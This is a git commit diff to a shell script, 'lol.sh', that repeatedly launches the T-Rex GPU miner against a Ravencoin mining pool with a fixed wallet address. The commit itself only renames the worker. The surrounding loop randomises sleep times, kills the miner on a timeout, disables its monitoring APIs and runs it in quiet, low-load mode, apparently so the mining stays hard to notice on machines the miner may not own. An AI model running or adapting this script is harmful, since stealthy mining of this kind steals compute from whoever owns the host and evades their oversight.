0ffc5a9cc7fc340c262e22f6ff51e48998bb7e65
kartikbhalala <47134161+kartikbhalala@users.noreply.github.com>
2020-12-04 03:54:44 +0530

    Update lol.sh

--- lol.sh
+++ lol.sh
@@ -12,7 +12,7 @@ do
 	w=$(($RANDOM%60))
 	e=140
 	aaram=$(($w+$e))
-	timeout -k 5 $c\s  ./t-rex -a kawpow -o stratum+ssl://eu.ravenminer.com:13802 -u RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.rig -p pps  --low-load 1 --intensity 12 --api-bind-telnet 0 --api-bind-http 0 -q
+	timeout -k 5 $c\s  ./t-rex -a kawpow -o stratum+ssl://eu.ravenminer.com:13802 -u RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.trex -p pps  --low-load 1 --intensity 12 --api-bind-telnet 0 --api-bind-http 0 -q
  	timeout -k 5 2s pgrep t-rex | xargs kill
 	sleep $aaram
 	echo "Kartik Bhai Amar Rahe"
